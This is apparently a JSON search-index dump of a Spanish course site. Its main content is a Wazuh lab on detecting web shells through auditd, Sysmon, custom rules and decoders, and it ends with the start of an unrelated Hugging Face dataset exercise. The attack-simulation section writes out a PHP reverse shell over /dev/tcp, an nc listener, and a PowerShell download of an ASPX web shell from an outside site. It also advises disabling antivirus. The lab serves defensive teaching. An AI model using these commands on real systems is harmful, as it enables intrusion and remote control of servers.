<p>La segunda regla es similar, s\u00f3lo que intenta detectar la modificaci\u00f3n y no la creaci\u00f3n de archivos.</p> <p>La tercera regla intenta detectar modificaciones de archivo, es decir que se haya disparado la segunda regla, y que \u00e9stas adem\u00e1s incluyan funciontes t\u00edpicas de webshells.</p>"},{"location":"Gestion_incidentes/wazuh/#usando-reglas-personalizadas-para-detectar-indicios-de-web-shells","title":"Usando reglas personalizadas para detectar indicios de web shells","text":"<p>Wazuh permite escribir reglas personalizadas que disparan alertas cuando se detectan determinadas caracter\u00edsticas en logs. Adem\u00e1s integraremos Wazuh con auditd en endpoints Linux y Sysmon en Windows para enriquecer los fuentes de logs, para as\u00ed mejorar la seguridad.</p>"},{"location":"Gestion_incidentes/wazuh/#ubuntu","title":"Ubuntu","text":"<p>Auditd (de Linux Audit Daemon) es una utilidad que recopila y almacena eventos del sistema tales como llamadas al sistema (syscall) y funciones. Usando auditd podemos monitorizar comandos del sistema as\u00ed como conexiones de red que lleve a cabo un usuario de servidor web, escribiendo reglas que generen una alerta cuando esto ocurra.</p> <p>As\u00ed las cosas:</p> <ol> <li> <p>Actualizar los paquetes de los respositorios e instalar auditd:</p> <pre><code>$ sudo apt update\n$ sudo apt install auditd\n</code></pre> </li> <li> <p>Enviar los logs de auditd al servidor de Wazuh para su an\u00e1lisis, a\u00f1adiendo para ello la siguiente configuraci\u00f3n al agente de Wazuh en el archivo <code>/var/ossec/etc/ossec.conf</code>:</p> <pre><code>&lt;ossec_config&gt;\n&lt;localfile&gt;\n    &lt;location&gt;/var/log/audit/audit.log&lt;/location&gt;\n    &lt;log_format&gt;audit&lt;/log_format&gt;\n&lt;/localfile&gt;\n&lt;/ossec_config&gt;\n</code></pre> </li> <li> <p>Obtener el identificador dle usuario del servidor web Apache ejecutando el siguiente comando:</p> <pre><code>$ sudo apachectl -S\n</code></pre> Salida <pre><code>VirtualHost configuration:\n*:80                   127.0.1.1 (/etc/apache2/sites-enabled/000-default.conf:1)\nServerRoot: \"/etc/apache2\"\nMain DocumentRoot: \"/var/www/html\"\nMain ErrorLog: \"/var/log/apache2/error.log\"\nMutex mpm-accept: using_defaults\nMutex watchdog-callback: using_defaults\nMutex default: dir=\"/var/run/apache2/\" mechanism=default \nPidFile: \"/var/run/apache2/apache2.pid\"\nDefine: DUMP_VHOSTS\nDefine: DUMP_RUN_CFG\nUser: name=\"www-data\" id=33\nGroup: name=\"www-data\" id=33\n</code></pre> </li> <li> <p>A\u00f1adir al archivo de configuraci\u00f3n de auditd <code>/etc/audit/rules.d/audit.rules</code>, usando el id de usuario en el paso 3, lo siguiente:</p> <pre><code>## Auditd rules that detect command execution from user www-data.\n-a always,exit -F arch=b32 -S execve -F uid=&lt;USER_ID&gt; -F key=webshell_command_exec\n-a always,exit -F arch=b64 -S execve -F uid=&lt;USER_ID&gt; -F key=webshell_command_exec\n\n## Auditd rules that detect network connections from user www-data.\n-a always,exit -F arch=b64 -S socket -F a0=10 -F euid=&lt;USER_ID&gt; -k webshell_net_connect\n-a always,exit -F arch=b64 -S socket -F a0=2 -F euid=&lt;USER_ID&gt; -k webshell_net_connect\n-a always,exit -F arch=b32 -S socket -F a0=10 -F euid=&lt;USER_ID&gt; -k webshell_net_connect\n-a always,exit -F arch=b32 -S socket -F a0=2 -F euid=&lt;USER_ID&gt; -k webshell_net_connect\n</code></pre> </li> <li> <p>Reiniciar auditd y el agente de Wazuh para aplicar los cambios en la configuraci\u00f3n:</p> </li> </ol> <pre><code>$ sudo systemctl restart auditd\n$ sudo systemctl restart wazuh-agent\n</code></pre>"},{"location":"Gestion_incidentes/wazuh/#windows","title":"Windows","text":"<p>System Monitor (Sysmon) es un servicio de sistema de Windows que monitoriza y registra la actividad del sistema en los logs de eventos de Windows.</p> <p>Complementa los logs con informaci\u00f3n detallada sobre la creaci\u00f3n de procesos o conexiones de red, entre otros. Por ejemplo, Sysmon puede monitorizar el proceso <code>w3wp.exe,</code>componente fundamental del servidor web de Microsoft Internet Information Services (IIS). Este proceso se encarga de manejar las solicitudes HTTP recibidas por el servidor web y de procesarlas para generar las respuestas correspondientes.</p> <p>IIS tiene una funcionalidad de seguridad llamada application pool que permite que un pool de aplicaciones se ejecuten \u00fanicamente con una \u00fanica cuenta, cuyo nombre por defecto es <code>DefaultAppTool</code>. </p> <p>Con esta cuenta, el proceso de IIS corre exclusivamente con privilegios de usuario. Los atacantes suelen aprovechar este proceso para abrir terminales de PowerShell o cmd. </p> <p>Explicado lo anterior, para configurar Sysmon y que Wazuh procese sus logs, haremos:</p> <ol> <li> <p>Descargar en nuestra m\u00e1quina Windows el instalador de Sysmon y el archivo de configuraci\u00f3n que necesitamos</p> </li> <li> <p>Instalar Sysmon, usando la configuraci\u00f3n descargada, mediante un terminal de PowerShell corriendo con privilegios de administrador:</p> </li> </ol> <pre><code>&gt; .\\Sysmon64.exe -accepteula -i sysmonconfig.xml\n</code></pre> <ol> <li>A\u00f1adir las siguientes l\u00edneas de configuraci\u00f3n al archivo <code>C:\\Program Files (x86)\\ossec-agent\\ossec.conf</code>, encargado de la captura y redireci\u00f3n de logs de Sysmon hacia el servidor de Wazuh:</li> </ol> <pre><code>&lt;ossec_config&gt;\n  &lt;localfile&gt;\n    &lt;location&gt;Microsoft-Windows-Sysmon/Operational&lt;/location&gt;\n    &lt;log_format&gt;eventchannel&lt;/log_format&gt;\n  &lt;/localfile&gt;\n&lt;/ossec_config&gt;\n</code></pre> <ol> <li> <p>Reiniciar el agente de Wazuh para aplicar los cambios en la configuraci\u00f3n:</p> <pre><code>&gt; Restart-Service -Name wazuh\n</code></pre> </li> </ol>"},{"location":"Gestion_incidentes/wazuh/#amazon-linux-2-wazuh-server","title":"Amazon Linux 2 (Wazuh server)","text":"<ol> <li> <p>A\u00f1adir al archivo de configuraci\u00f3n <code>/var/ossec/etc/rules/reglas_webshell.xml</code>, las siguientes reglas que intenta detectar comandos ejecutados por una web shell, as\u00ed como conexiones de red establecidas:</p> reglas_webshell.xml <pre><code>&lt;!-- Reglas Linux. --&gt;\n&lt;group name=\"auditd, linux, webshell,\"&gt;\n&lt;!-- Eta regla detecta comandos ejecutados por una web shell --&gt;\n&lt;rule id=\"100520\" level=\"12\"&gt;\n    &lt;if_sid&gt;80700&lt;/if_sid&gt;\n    &lt;field name=\"audit.key\"&gt;webshell_command_exec&lt;/field&gt;\n    &lt;description&gt;[Command execution ($(audit.exe))]: Possible web shell attack detected&lt;/description&gt;\n    &lt;mitre&gt;\n    &lt;id&gt;T1505.003&lt;/id&gt;\n    &lt;id&gt;T1059.004&lt;/id&gt;\n    &lt;/mitre&gt;\n&lt;/rule&gt;\n&lt;!-- Esta regla detecta conexiones de red realizadas por una web shell --&gt;\n&lt;rule id=\"100521\" level=\"12\"&gt;\n    &lt;if_sid&gt;80700&lt;/if_sid&gt;\n    &lt;field name=\"audit.key\"&gt;webshell_net_connect&lt;/field&gt;\n    &lt;description&gt;[Network connection via $(audit.exe)]: Possible web shell attack detected&lt;/description&gt;\n    &lt;mitre&gt;\n    &lt;id&gt;TA0011&lt;/id&gt;\n    &lt;id&gt;T1049&lt;/id&gt;\n    &lt;id&gt;T1505.003&lt;/id&gt;\n    &lt;/mitre&gt;\n&lt;/rule&gt;\n&lt;/group&gt;\n\n&lt;!-- Reglas Windows --&gt;\n&lt;group name=\"sysmon, webshell, windows,\"&gt;\n&lt;!-- Esta regla detecta comandos ejecutados por una web shell  --&gt;\n&lt;rule id=\"100530\" level=\"12\"&gt;\n    &lt;if_sid&gt;61603&lt;/if_sid&gt;\n    &lt;field name=\"win.eventdata.parentImage\" type=\"pcre2\"&gt;(?i)w3wp\\.exe&lt;/field&gt;\n    &lt;field name=\"win.eventdata.parentUser\" type=\"pcre2\"&gt;(?i)IIS\\sAPPPOOL\\\\\\\\DefaultAppPool&lt;/field&gt;\n    &lt;description&gt;[Command execution ($(win.eventdata.commandLine))]: Possible web shell attack detected&lt;/description&gt;\n    &lt;mitre&gt;\n    &lt;id&gt;T1505.003&lt;/id&gt;\n    &lt;id&gt;T1059.004&lt;/id&gt;\n    &lt;/mitre&gt;\n&lt;/rule&gt;\n\n&lt;!-- Esta regla detecta conexiones de red realizadas por una web shell --&gt;\n&lt;rule id=\"100531\" level=\"12\"&gt;\n    &lt;if_sid&gt;61605&lt;/if_sid&gt;\n    &lt;field name=\"win.eventdata.image\" type=\"pcre2\"&gt;(?i)w3wp\\.exe&lt;/field&gt;\n    &lt;field name=\"win.eventdata.user\" type=\"pcre2\"&gt;(?i)IIS\\sAPPPOOL\\\\\\\\DefaultAppPool&lt;/field&gt;\n    &lt;description&gt;[Network connection]: Possible web shell attempting network connection on source port: $(win.eventdata.sourcePort) and destination port: $(win.eventdata.destinationPort)&lt;/description&gt;\n    &lt;mitre&gt;\n    &lt;id&gt;TA0011&lt;/id&gt;\n    &lt;id&gt;T1049&lt;/id&gt;\n    &lt;id&gt;T1505.003&lt;/id&gt;\n    &lt;/mitre&gt;\n&lt;/rule&gt;\n&lt;/group&gt;\n</code></pre> </li> <li> <p>Reiniciar el manager de Wazuh para aplicar los cambios en la configuraci\u00f3n:</p> <pre><code>$ sudo systemctl restart wazuh-manager\n</code></pre> </li> </ol>"},{"location":"Gestion_incidentes/wazuh/#usando-monitorizacion-de-comandos-para-detectar-las-conexiones-de-red-de-un-posible-ataque","title":"Usando monitorizaci\u00f3n de comandos para detectar las conexiones de red de un posible ataque","text":"<p>En esta secci\u00f3n usaremos la monitorizaci\u00f3n de comandos para complementar el uso de auditd en el endpoint Linux. Nos servir\u00e1 para obtener informaci\u00f3n adicional sobre las direcciones IP/puertos desde los que se originan los ataques.</p>"},{"location":"Gestion_incidentes/wazuh/#ubuntu_1","title":"Ubuntu","text":"<ol> <li> <p>A\u00f1adir las siguientes configuraciones al archivo de configuraci\u00f3n del agente Wazuh <code>/var/ossec/etc/ossec.conf</code>. Esto determina el comando que se ejecutar\u00e1 en el endpoint:</p> <p><pre><code>&lt;ossec_config&gt;\n&lt;localfile&gt;\n    &lt;log_format&gt;full_command&lt;/log_format&gt;\n    &lt;command&gt;ss -nputw | egrep '\"sh\"|\"bash\"|\"csh\"|\"ksh\"|\"zsh\"' | awk '{ print $5 \"|\" $6 }'&lt;/command&gt;\n    &lt;alias&gt;webshell connections&lt;/alias&gt;\n    &lt;frequency&gt;120&lt;/frequency&gt;\n&lt;/localfile&gt;\n&lt;/ossec_config&gt;\n</code></pre> Como vemos, este comando se ejecuta cada 120 segundos con el fin de detectar conexiones activas abiertas por shells como <code>bash</code>, <code>zsh</code>, etc.</p> </li> <li> <p>Reiniciar el agente de Wazuh par aplicar los cambios de configuraci\u00f3n:</p> <pre><code>$ sudo systemctl restart wazuh-agent\n</code></pre> </li> </ol>"},{"location":"Gestion_incidentes/wazuh/#amazon-linux-2-wazuh-server_1","title":"Amazon Linux 2 (Wazuh server)","text":"<ol> <li> <p>A\u00f1adir, en el archivo de configuraci\u00f3n <code>/var/ossec/etc/decoders/local_decoder.xml</code> los siguientes decodificadores para decodificar patrones de conexiones de red establecidas por web shells en los servidores web:</p> <pre><code>&lt;!-- Decodificar para las conexiones de red de web shells --&gt;\n&lt;decoder name=\"network-traffic-child\"&gt;\n  &lt;parent&gt;ossec&lt;/parent&gt;\n  &lt;prematch offset=\"after_parent\"&gt;^output: 'webshell connections':&lt;/prematch&gt;\n  &lt;regex offset=\"after_prematch\" type=\"pcre2\"&gt;(\\d+.\\d+.\\d+.\\d+):(\\d+)\\|(\\d+.\\d+.\\d+.\\d+):(\\d+)&lt;/regex&gt;\n  &lt;order&gt;local_ip, local_port, foreign_ip, foreign_port&lt;/order&gt;\n&lt;/decoder&gt;\n</code></pre> </li> <li> <p>A\u00f1adir al archivo de configuraci\u00f3n <code>/var/ossec/etc/rules/reglas_webshell.xml</code>, las siguientes reglas que intentna detectar conexiones de red establecidas por web shells en los servidores web:</p> <pre><code>&lt;!-- Regla detectar conexiones red web shells --&gt;\n&lt;group name=\"linux, webshell,\"&gt;\n  &lt;rule id=\"100510\" level=\"12\"&gt;\n    &lt;decoded_as&gt;ossec&lt;/decoded_as&gt;\n    &lt;match&gt;ossec: output: 'webshell connections'&lt;/match&gt;\n    &lt;description&gt;[Network connection]: Script attempting network connection on source port: $(local_port) and destination port: $(foreign_port)&lt;/description&gt;\n    &lt;mitre&gt;\n      &lt;id&gt;TA0011&lt;/id&gt;\n      &lt;id&gt;T1049&lt;/id&gt;\n      &lt;id&gt;T1505.003&lt;/id&gt;\n   &lt;/mitre&gt;\n  &lt;/rule&gt;\n&lt;/group&gt;\n</code></pre> </li> <li> <p>Reiniciar el manager de Wazuh para aplicar los cambios en la configuraci\u00f3n:</p> <pre><code>$ sudo systemctl restart wazuh-manager\n</code></pre> </li> </ol>"},{"location":"Gestion_incidentes/wazuh/#simulacion-de-ataque","title":"Simulaci\u00f3n de ataque","text":"<p>A continuaci\u00f3n se detallan los pasos para simular como funcionan las web shells en los endpoints comprometidos.</p>"},{"location":"Gestion_incidentes/wazuh/#pasos-para-simular-el-ataque-contra-el-endpoint-ubuntu","title":"Pasos para simular el ataque contra el endpoint Ubuntu","text":""},{"location":"Gestion_incidentes/wazuh/#ubuntu_2","title":"Ubuntu","text":"<p>Ejecutar los siguientes pasos con privilegio de root.</p> <ol> <li> <p>Crear un archivo, por ejemplo <code>webshell.php</code> en el directorio del servidor web <code>/var/www/html</code> con la siguiente l\u00ednea de c\u00f3digo que ejecutar\u00e1 una shell inversa:</p> <pre><code>echo -e \"&lt;?php exec('/bin/bash -c \\\"bash -i &gt;&amp; /dev/tcp/&lt;IP_DEBIAN&gt;/4444 0&gt;&amp;1\\\"');?&gt;\" &gt; /var/www/html/webshell.php\n</code></pre> </li> </ol>"},{"location":"Gestion_incidentes/wazuh/#debian","title":"Debian","text":"<ol> <li> <p>En el terminal de nuestra Debian utilizaremos netcat (nc, instaladlo si no lo est\u00e1) para escuchar conexiones en el puerto 4444:</p> <pre><code>$ nc -nlvp 4444\n</code></pre> </li> <li> <p>Ejecutar la web shell desde nuestro navegador accediendo a la URL <code>http://&lt;IP_UBUNTU&gt;/webshell.php</code>, de tal forma que se establezca una shell inversa con el endpoint Ubuntu hacia nuestra Debian atacante.</p> </li> <li> <p>En el terminal que nos aparecer\u00e1 en el netcat de nuestra Debian, ejecutar varios comandos tales como <code>id</code>, <code>cat /etc/passwd</code>, <code>whoami</code>...</p> </li> </ol>"},{"location":"Gestion_incidentes/wazuh/#ver-las-alertas","title":"Ver las alertas","text":"<p>En el dashboard de Wazuh, navegar a Security events y visualizar las alertas generadas:</p>"},{"location":"Gestion_incidentes/wazuh/#pasos-para-simular-el-ataque-contra-el-endpoint-windows","title":"Pasos para simular el ataque contra el endpoint Windows","text":""},{"location":"Gestion_incidentes/wazuh/#windows_1","title":"Windows","text":"<p>Atenci\u00f3n</p> <p>Es m\u00e1s que probable que necesit\u00e9is desactivar el antivirus y la detecci\u00f3n de amenazas de Windows para que os funcione esta parte.</p> <p>Ejecutar los siguientes pasos en una terminal de PowerShell ejecut\u00e1ndose como administrador:</p> <ol> <li> <p>Descargar una copia de una web shell en el directorio del servidor web <code>C:\\inetput\\wwwroot</code> y llamarla, por ejemplo, <code>webshell.aspx</code>:</p> <pre><code>&gt; Invoke-WebRequest -OutFile 'C:\\Users\\Public\\Downloads\\webshell.aspx' -Uri https://privdayz.com/cdn/txt/aspx.txt\n&gt; copy 'C:\\Users\\Public\\Downloads\\webshell.aspx' 'C:\\inetpub\\wwwroot\\webshell.aspx'\n</code></pre> </li> </ol>"},{"location":"Gestion_incidentes/wazuh/#debian_1","title":"Debian","text":"<ol> <li> <p>En el terminal de nuestra Debian escuchamos conexiones en el puerto 4444:</p> <pre><code>$ nc -nlvp 4444\n</code></pre> </li> <li> <p>Acceder a la web shell desde nuestro navegador mediante la URL <code>http://&lt;IP_WINDOWS&gt;/webshell.aspx</code>.</p> <p>La contrase\u00f1a de la web shell es admin. En el men\u00fa CmdShell, ejecuta comandos tales como <code>whoami</code>, <code>ipconfig</code>...</p> </li> <li> <p>En el men\u00fa PortMap, introducir la IP de nuestra Debian como Remote IP, <code>4444</code> como Remote Port y <code>5555</code> como Local Port. Tras ello, pulsar MapPort</p> </li> </ol>"},{"location":"Gestion_incidentes/wazuh/#ver-las-alertas_1","title":"Ver las alertas","text":"<p>En el dashboard de Wazuh, navegar a Security events y visualizar las alertas generadas:</p>"},{"location":"Gestion_incidentes/wazuh/#recapitulacion-y-conclusiones","title":"Recapitulaci\u00f3n y conclusiones","text":"<ul> <li> <p>Las web shells de cualquier tipo suelen tener comportamientos similares, esto es, crean o modifican archivos presentes en los directorios de los servidores web, realizando conexiones de red para establecer shells inversas y ejecutando comandos para tareas post-explotaci\u00f3n.</p> </li> <li> <p>Con Wazuh podemos ser capaces de detectar estas web shells, usando FIM y la monitorizaci\u00f3n de comandos</p> </li> <li> <p>Tambi\u00e9n hemos realizado la integraci\u00f3n de auditd y Sysmon con Wazuh, aportando as\u00ed m\u00e1s informaci\u00f3n a los logs, siendo capaces de realizar una mejor detecci\u00f3n en los endpoints comprometidos</p> </li> <li> <p>No obstante, es recomendable que las organizaciones adem\u00e1s tengan en marcha defensas contra las tareas de post-explotaci\u00f3n como puedan ser el escaneo y parcheo de sistemas y aplicaciones vulnerables, as\u00ed como pol\u00edticas de seguridad que monitoricen malas configuraciones de los sistemas.</p> </li> </ul>"},{"location":"Gestion_incidentes/wazuh/#anexo-despliegue-de-instancias-ec2-linux-y-windows-en-aws","title":"Anexo: despliegue de instancias EC2 Linux y Windows en AWS","text":"<p>Una vez tenemos creados nuestro laboratorio (Learner Lab)en AWS Academy, podremos hacer uso de varios servicios de Amazon Web Services, dentro de unos l\u00edmites, aunque estos l\u00edmites no nos afectan para nuestro prop\u00f3sito.</p> <p>Amazon ofrece una cantidad ingente de servicios que pod\u00e9is consultar en los cap\u00edtulos 1, 3 y 9 del curso de AWS Foundations. Uno de estos servicios es el de computaci\u00f3n, es decir, la creaci\u00f3n de instancias EC2 (Elastic Compute Cloud). Esto no es m\u00e1s que la creaci\u00f3n de m\u00e1quinas virtuales en la nube, lo cual nos es de extrema utilidad para el caso que nos ocupa.</p> <p>A continuaci\u00f3n se mostrar\u00e1 detalladamente el proceso de creaci\u00f3n de instancias Linux y Windows, as\u00ed como la forma de conectarse a dichas instancias.</p>"},{"location":"Gestion_incidentes/wazuh/#ec2-linux","title":"EC2 Linux","text":"<p>En primer lugar deb\u00e9is entrar en vuestro Learner Lab y acceder a los contenidos:</p> <p></p> <p>E ir a la pantalla de lanzamiento del laboratorio:</p> <p></p> <p>Le daremos a iniciar laboratorio y esperaremos a que el icono marcado se ponga en verde. Una vez lo est\u00e9, haremos click en \u00e9l para que nos lleve a la p\u00e1gina de administraci\u00f3n de servicios de AWS:</p> <p></p> <p>Una vez en esta p\u00e1gina, el servicio que a nosotros nos interesa en este momento son las instancias EC2. As\u00ed pues, escribimos esto en la caja de b\u00fasqueda:</p> <p></p> <p>Le decimos que queremos lanzar una nueva instancia:</p> <p></p> <p>E iremos completando los detalles necesarios, como nombre o imagen de la m\u00e1quina que se crear\u00e1 (Amazon Linux, Ubuntu, Debian, Windows...). En esta caso se ilustra el ejemplo de la m\u00e1quina cliente Ubuntu pero habr\u00eda que seleccionar seg\u00fan el caso:</p> <p></p> <p>Podemos elegir distintos tipos de instancias, con distintos precios por uso, as\u00ed como propiedades (CPU+RAM). Para el caso de las instancias Linux, nos basta una t2.micro. Para el caso de las Windows, debemos elegir t2.medium para no quedarnos demasiado cortos.</p> <p></p> <p>En el apartado de Claves de sesi\u00f3n, elegiremos vockey. Esto nos permitir\u00e1 m\u00e1s tarde conectarnos a las instancias:</p> <p></p> <p>En configuraciones de red lo \u00fanico que debemos hacer es dejar marcada la opci\u00f3n por defecto Crear grupo de seguridad y marcarle que permita tanto el tr\u00e1fico SSH desde cualquier lugar, como el tr\u00e1fico HTTP desde Internet.</p> <p>Los grupos de seguridad son, de forma aproximada, una especie de Firewall que filtra las conexiones desde y hacia nuestras instancias.</p> <p>\u00a1Atenci\u00f3n!</p> <p>Los clientes Linux y Windows que contendr\u00e1n sendos agentes, alojan su contenido mediante servidores web en el puerto (80), HTTP. Sin embargo, el servidor de Wazuh o Wazuh manager, utiliza s\u00f3lo HTTPS con certificado autofirmado para su interfaz web. </p> <p>Tened esto en cuenta a la hora de crear la instancia y marcad la casilla correspondiente. </p> <p>Si os despist\u00e1is, m\u00e1s adelante se explica c\u00f3mo modificar grupos de seguridad.</p> <p>Tras lanzar la instancia, se encontrar\u00e1 en estado Iniciando y despu\u00e9s pasar\u00e1 a En ejecuci\u00f3n.</p>"},{"location":"Gestion_incidentes/wazuh/#ec2-windows","title":"EC2 Windows","text":"<p>Lanzamos otra vez una nueva instancia, indicando el nombre que queramos y dici\u00e9ndole que se tratar\u00e1 de un Windows:</p> <p></p> <p>Puesto que carecemos de la opci\u00f3n de un Windows 10/11, utilizaremos entonces un Windows Server como cliente.</p> <p>Como se indic\u00f3 anteriormente, ha de ser t2.medium: </p> <p></p> <p>De nuevo, indicamos las claves vockey y permitimos tanto tr\u00e1fico SSH, como HTTP:</p> <p></p> <p>Tras lanzar la instancia, se encontrar\u00e1 en estado Iniciando y despu\u00e9s pasar\u00e1 a En ejecuci\u00f3n.</p>"},{"location":"Gestion_incidentes/wazuh/#cuestiones-genericas","title":"Cuestiones gen\u00e9ricas","text":""},{"location":"Gestion_incidentes/wazuh/#mas-reglas-en-los-grupos-de-seguridad","title":"M\u00e1s reglas en los grupos de seguridad","text":"<p>Para el servidor de Wazuh y para la m\u00e1quina atacante, vamos a modificar sus grupos de seguridad para que puedan comunicarse con cualquier m\u00e1quina de la red sin problemas.</p> <p>Marcamos la instancia que queramos modificar y seleccionamos la pesta\u00f1a Seguridad:</p> <p></p> <p>Localizamos el grupo de seguridad y haremos click sobre \u00e9l:</p> <p></p> <p>Una vez dentro del grupo, editamos las reglas de entrada:</p> <p></p> <p>Las instancias se crean por defecto en la red <code>172.31.0.0/16</code>. Permitiremos entonces todo el tr\u00e1fico de entrada proveniente de dicha red, a\u00f1adiendo una regla a tal efecto:</p> <p></p>"},{"location":"Gestion_incidentes/wazuh/#conexion-remota-a-las-maquinas","title":"Conexi\u00f3n remota a las m\u00e1quinas","text":""},{"location":"Gestion_incidentes/wazuh/#linux","title":"Linux","text":"<p>Accedemos a la pantalla primig\u00e9nia desde donde lanzamos nuestro laboratorio y en la secci\u00f3n de AWS Details tendremos la posibilidad de descargarnos unas claves para la conexi\u00f3n que queremos llevar a cabo. As\u00ed pues, las descargamos, tal y como indica el paso 2:</p> <p></p> <p>Es importante darle los permisos adecuados a la clave privada reci\u00e9n descargada, de otra forma no nos permitir\u00e1 conectarnos. Una vez hecho, basta con realizar una conexi\u00f3n normal por SSH pero indicando con el par\u00e1metro <code>-i</code>que utilizaremos el archivo de claves que nos desacargamos en el paso anterior:</p> <p></p> <p>La IP p\u00fablica de cada instancia al a que queramos conectarnos podemos consultarla as\u00ed:</p> <p></p> <p>Y de esta forma ya podemos realizar cualquier acci\u00f3n que necesit\u00e1semos llevar a cabo, tal y como si se tratase de una m\u00e1quina virtual en nuestra m\u00e1quina.</p>"},{"location":"Gestion_incidentes/wazuh/#windows_2","title":"Windows","text":"<p>Para el caso de Windows, en lugar de conectarnos usando SSH, lo haremos mediante escritorio remoto (RDP). Para ello el proceso es un poco distinto, ve\u00e1moslo.</p> <p>Igual que para el caso de Linux, necesitaremos la clave privada que nos podemos descargar. No obstante, la conexi\u00f3n se realizar\u00e1 utilizando alg\u00fan cliente RDP. Si utiliz\u00e1is Windows para conectaros, el cliente lo tendr\u00e9is nativo. Si por otra parte utiliz\u00e1is Linux, necesitar\u00e9is alguna aplicaci\u00f3n tipo Remmina o similar.</p> <p>El primer paso ser\u00e1 seleccionar nuestra instancia Windows y darle a Conectar:</p> <p></p> <p>En esta secci\u00f3n le diremos que nos vamos a conectar mediante un cliente RDP:</p> <p></p> <p>Nos descargaremos el archivo .rdp que utilizaremos para conectarnos y, tras ello, le daremos a Obtener contrase\u00f1a para obtener las credenciales a utilizar:</p> <p></p> <p>Para poder obtener nuestra contrase\u00f1a debemos hacer uso del archivo de clave privada que nos descargamos en seccines anteriores (es el mismo para todas las instancias).</p> <p>Lo cargaremos y, una vez hecho, le daremos a descifrar contrase\u00f1a:</p> <p></p> <p>Una vez obtenida la contrase\u00f1a no queda m\u00e1s que utilizar el cliente RDP elegido (en mi caso Remmina) para abrir el archivo .rdp y conectarnos utilizando la contrase\u00f1a obtenida:</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>\u00a1Atenci\u00f3n!</p> <p>El laboratorio se apaga autom\u00e1ticamente a las 4 horas, tiempo m\u00e1s que suficiente para llevar a cabo la pr\u00e1ctica. En caso contrario, podr\u00e9is reiniciarlo puesto que s\u00f3lo se apagan las instancias pero no se pierde el trabajo.</p> <p>Si trabaj\u00e1is en varias tandas o acab\u00e1is antes de las 4 horas, apagadlo vosotros para evitar gastos innecearios en vuestro cr\u00e9dito de 100$. Para ello, en la p\u00e1gina de lanzamiento del laboratorio, esta vez le daremos a End lab</p>"},{"location":"Gestion_incidentes/wazuh/#despliegue-automatizado-del-escenario","title":"Despliegue automatizado del escenario","text":"<p>Para desplegar este escenario de forma automatizada en AWS se puede hacer uso del siguiente repositorio: </p> <p>https://github.com/raul-profesor/wazuh-webshells-terraform.git</p>"},{"location":"bedrock/Actividad1/","title":"Actividad 1 - Datasets de Hugging Face","text":""},{"location":"bedrock/Actividad1/#2-reto-gamificado-publica-tu-primer-dataset-en-hugging-face","title":"2\ufe0f\u20e3 Reto Gamificado: Publica tu primer Dataset en Hugging Face","text":""},{"location":"bedrock/Actividad1/#objetivo","title":"\ud83c\udfaf Objetivo","text":"<p>Aprender a trabajar con datasets en Hugging Face, realizar transformaciones y publicar un dataset en el Hugging Face Hub.</p>"},{"location":"bedrock/Actividad1/#niveles-del-reto","title":"\ud83d\udd79\ufe0f Niveles del reto","text":"<ol> <li>Descarga y explora: Cargar <code>SquadES</code>.</li> <li>Divide en train/test: Crear split adicional.</li> <li>A\u00f1ade columna: <code>num_paragraphs</code>.</li> <li>Filtra y persiste: Guardar en Parquet.</li> <li>Publica en Hugging Face: A\u00f1adir documentaci\u00f3n.</li> </ol>"},{"location":"bedrock/Actividad1/#plantilla-del-ejercicio","title":"\ud83d\udcc2 Plantilla del ejercicio","text":"<pre><code>from datasets import load_dataset\n\n# Nivel 1: Descargar y explorar\ndataset = load_dataset(\"PlanTL-GOB-ES/squad-es\")\nprint(dataset)\n\n# Nivel 2: Dividir en train/test\ntrain_dataset = dataset[\"train\"]\nsplit_dataset = train_dataset.train_test_split(test_size=0.2)\ntrain_split = split_dataset[\"train\"]\ntest_split = split_dataset[\"test\"]\n\n# Nivel 3: A\u00f1adir columna con cantidad de p\u00e1rrafos\ndef add_num_paragraphs(example):\n    return {\"num_paragraphs\": len(example[\"paragraphs\"])}\ntrain_split = train_split.map(add_num_paragraphs)\n\n# Nivel 4: Filtrar y persistir\nfiltered_train = train_split.filter(lambda x: x[\"num_paragraphs\"] &gt; 10)\nfiltered_train = filtered_train.remove_columns([\"num_paragraphs\"])\nfiltered_train.to_parquet(\"filtered_train.parquet\")\n\n# Nivel 5: Publicar en Hugging Face\n# filtered_train.push_to_hub(\"usuario/nombre-dataset\")\n</code></pre>"},{"location":"bedrock/Actividad1/#recursos","title":"\ud83d\udd17 Recursos","text":"<ul> <li>Hugging Face Datasets</li> <li>Documentaci\u00f3n oficial</li> </ul>"},{"location":"bedrock/Actividad1_solution/","title":"1. Descargar los datos de SquadES desde fuente remota","text":"<p>El primer paso es cargar los archivos de entrenamiento y validaci\u00f3n desde URLs remotas. Utilizaremos la funci\u00f3n <code>load_dataset()</code> de la librer\u00eda Hugging Face Datasets, indicando que queremos cargar archivos JSON alojados en GitHub. Los datos remotos se corresponden con <code>train-v2.0-es.json</code> (entrenamiento) y <code>dev-v2.0-es.json</code> (validaci\u00f3n).</p> <p><pre><code>from datasets import load_dataset\n\nurl = \"https://raw.githubusercontent.com/ccasimiro88/TranslateAlignRetrieve/master/SQuAD-es-v2.0/\"\ndata_files = {\n    \"train\": url + \"train-v2.0-es.json\",\n    \"val\": url + \"dev-v2.0-es.json\"\n}\nsquad_es = load_dataset(\"json\", data_files=data_files, field=\"data\")  # field=\"data\" porque los datos est\u00e1n bajo esa clave\nprint(squad_es)\n</code></pre> Esto produce un objeto DatasetDict con splits train y val, donde cada elemento tiene las claves title y paragraphs.\u200b</p>"},{"location":"bedrock/Actividad1_solution/#2-dividir-los-datos-de-entrenamiento-en-entrenamiento-y-prueba","title":"2. Dividir los datos de entrenamiento en entrenamiento y prueba","text":"<p>Para realizar una partici\u00f3n del <code>split</code> de entrenamiento en dos partes (por ejemplo, 90% entrenamiento y 10% prueba), usamos el m\u00e9todo <code>train_test_split()</code>:</p> <p><pre><code>squad_train_full = squad_es[\"train\"]\nsplit_dataset = squad_train_full.train_test_split(test_size=0.1, seed=42)\nsquad_train = split_dataset[\"train\"]\nsquad_test = split_dataset[\"test\"]\nprint(squad_train)\nprint(squad_test)\n</code></pre> Ahora disponemos de <code>squad_train</code> (entrenamiento 90%) y <code>squad_test</code> (prueba 10%).\u200b</p>"},{"location":"bedrock/Actividad1_solution/#3-anadir-una-columna-con-el-numero-de-parrafos","title":"3. A\u00f1adir una columna con el n\u00famero de p\u00e1rrafos","text":"<p>Podemos emplear el m\u00e9todo <code>map()</code> para agregar una columna llamada, por ejemplo, <code>num_paragraphs</code>, contando los elementos en la clave <code>paragraphs</code> de cada ejemplo.</p> <p><pre><code>squad_train = squad_train.map(lambda x: 